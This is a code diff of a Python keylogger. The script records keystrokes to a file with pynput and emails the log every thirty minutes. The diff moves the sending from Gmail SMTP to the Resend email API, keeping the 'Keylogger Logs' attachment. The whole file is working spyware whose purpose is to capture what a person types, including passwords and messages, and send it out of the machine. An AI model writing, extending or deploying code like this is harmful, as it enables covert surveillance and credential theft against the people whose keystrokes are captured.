@@ -1,25 +1,18 @@
 #!/usr/bin/env python3
 import os
-import threading
 import time
-import smtplib
-from email.message import EmailMessage
+import threading
 
 from dotenv import load_dotenv
 from pynput.keyboard import Listener
+import resend
 
 load_dotenv()
 
+resend.api_key = os.environ["RESEND_API_KEY"]
+
 LOG_FILE = "keys.txt"
 EMAIL_DELAY = 1800  # delay in seconds
-
-# Email details
-sender_email = os.environ["GMAIL_USER"]
-receiver_email = os.environ["GMAIL_USER"]
-password = os.environ["GMAIL_PASSWORD"]
-
-mailserver = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-mailserver.login(sender_email, password)
 
 
 def send_email():
@@ -28,21 +21,20 @@ def send_email():
             with open(LOG_FILE, "rb") as f:
                 file_data = f.read()
 
-            # Create email
-            msg = EmailMessage()
-            msg["Subject"] = "Keylogger Logs"
-            msg["From"] = sender_email
-            msg["To"] = receiver_email
+            attachment: resend.Attachment = {
+                "content": list(file_data),
+                "filename": f.name,
+            }
 
-            # Attach file
-            msg.add_attachment(
-                file_data,
-                maintype="application",
-                subtype="octet-stream",
-                filename=f.name,
-            )
+            params: resend.Emails.SendParams = {
+                "from": "Keylogger <onboarding@resend.dev>",
+                "to": [os.environ["EMAIL"]],
+                "subject": "Keylogger Logs",
+                "html": "<p>This file contains the logs.</p>",
+                "attachments": [attachment],
+            }
 
-            mailserver.send_message(msg)
+            resend.Emails.send(params)
         except FileNotFoundError:
             pass
 
